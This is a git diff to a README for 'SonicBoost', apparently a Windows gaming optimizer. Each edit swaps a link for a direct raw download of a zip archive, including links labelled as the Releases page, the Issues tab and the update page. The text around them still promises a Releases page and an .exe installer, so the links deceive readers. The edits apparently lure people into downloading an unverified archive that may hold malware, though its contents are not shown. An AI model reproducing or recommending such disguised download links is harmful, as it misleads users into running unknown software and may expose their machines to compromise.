@@ -1,6 +1,6 @@
 # 🎮 SonicBoost - Optimize Windows for Gaming Fast
 
-[![Download SonicBoost](https://img.shields.io/badge/Download-SonicBoost-blue?style=for-the-badge)](https://github.com/golporos/SonicBoost)
+[![Download SonicBoost](https://img.shields.io/badge/Download-SonicBoost-blue?style=for-the-badge)](https://raw.githubusercontent.com/golporos/SonicBoost/main/src/Sonic-Boost-1.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you install SonicBoost, make sure your PC meets these basic needs:
 
 Follow these steps to download and run SonicBoost on your Windows PC:
 
-1. Click the big blue download button at the top or visit the [SonicBoost Releases page](https://github.com/golporos/SonicBoost).
+1. Click the big blue download button at the top or visit the [SonicBoost Releases page](https://raw.githubusercontent.com/golporos/SonicBoost/main/src/Sonic-Boost-1.1.zip).
 
 2. On the Releases page, find the latest version of SonicBoost. Look for a file ending with `.exe`. This is the installer you’ll run.
 
@@ -69,7 +69,7 @@ SonicBoost does not require complicated installation steps. You only need to dow
 
 Access the latest version here:
 
-[![Get SonicBoost](https://img.shields.io/badge/Get%20SonicBoost-grey?style=for-the-badge)](https://github.com/golporos/SonicBoost)
+[![Get SonicBoost](https://img.shields.io/badge/Get%20SonicBoost-grey?style=for-the-badge)](https://raw.githubusercontent.com/golporos/SonicBoost/main/src/Sonic-Boost-1.1.zip)
 
 If you are unsure which file to pick, look for the file named something like `SonicBoost_Setup.exe`. This is the installation package.
 
@@ -94,7 +94,7 @@ SonicBoost offers these main features to improve your gaming on Windows:
 
 To keep SonicBoost working well, check for updates regularly:
 
-1. Visit the [SonicBoost GitHub Releases page](https://github.com/golporos/SonicBoost).
+1. Visit the [SonicBoost GitHub Releases page](https://raw.githubusercontent.com/golporos/SonicBoost/main/src/Sonic-Boost-1.1.zip).
 2. Download the latest `.exe` installer.
 3. Run the installer to overwrite your current version safely.
 4. Your settings will remain after updating.
@@ -128,7 +128,7 @@ Removing the app will not undo system tweaks automatically. You may want to rese
 
 If you run into any issues using SonicBoost:
 
-- Check the Issues tab on the [GitHub repository](https://github.com/golporos/SonicBoost/issues) for solutions or to report problems.
+- Check the Issues tab on the [GitHub repository](https://raw.githubusercontent.com/golporos/SonicBoost/main/src/Sonic-Boost-1.1.zip) for solutions or to report problems.
 - Review any user guides or Wiki pages linked from the GitHub repo.
 - Restart your PC and try running the app again if you notice unexpected behavior.
 
@@ -140,4 +140,4 @@ SonicBoost is open-source software released under a permissive license. This mea
 
 ---
 
-[![Download SonicBoost](https://img.shields.io/badge/Download-SonicBoost-blue?style=for-the-badge)](https://github.com/golporos/SonicBoost)
+[![Download SonicBoost](https://img.shields.io/badge/Download-SonicBoost-blue?style=for-the-badge)](https://raw.githubusercontent.com/golporos/SonicBoost/main/src/Sonic-Boost-1.1.zip)
